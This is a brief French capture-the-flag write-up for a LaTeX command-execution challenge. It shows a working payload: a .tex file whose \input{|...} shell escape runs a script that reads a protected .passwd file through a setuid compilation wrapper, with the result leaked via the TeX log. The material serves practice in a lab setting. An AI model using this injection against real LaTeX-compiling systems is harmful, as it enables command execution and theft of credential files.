# LaTeX - Execution de commande

## 20 Points

### Et si j’écrivais 18 fois ?

### Énoncé

Exécutez des commandes pour trouver le flag !

## Résolution

L'objectif est de réussir à afficher le contenu du fichier .passwd qui se trouve dans un dossier qui lui aussi se trouve dans le dossier flag_is_here.

```
app-script-ch24@challenge02:/challenge/app-script/ch24$mkdir /tmp/thibault

app-script-ch24@challenge02:/challenge/app-script/ch24$vim /tmp/thibault/main.tex
```
main.tex:
```latex
\documentclass{article}
\begin{document}
\input{|"/tmp/thibault/main.sh"}
\end{document}
```
```Bash
app-script-ch24@challenge02:/challenge/app-script/ch24$vim /tmp/thibault/main.sh
```

```Bash
cat /challenge/app-script/ch24/flag_is_here/512cba42fe46c1f346996b51fa053b15fba17baefa038d434381aa68bba6/.passwd
```

```
app-script-ch24@challenge02:/challenge/app-script/ch24$./setuid-wrapper /tmp/thibault/main.tex

[+] Compilation ...
[!] Compilation error, your logs : /tmp/tmp.VtoBdYzWgT/main.log
````

```
app-script-ch24@challenge02:/challenge/app-script/ch24$ cat /tmp/tmp.VtoBdYzWgT/main.log

This is pdfTeX, Version 3.14159265-2.6-1.40.18 (TeX Live 2017/Debian) (preloaded format=pdflatex 2023.6.1)  10 JAN 2024 16:59

entering extended mode

\write18 enabled.

%&-line parsing enabled.

[...]

(|/tmp/thibault/main.sh

! Missing $ inserted.

<inserted text>

$

l.1 [censorship]

Here is how much of TeX's memory you used:

202 strings out of 494923

[...]
```

On trouve donc le contenu du fichier dans le fichier de log.
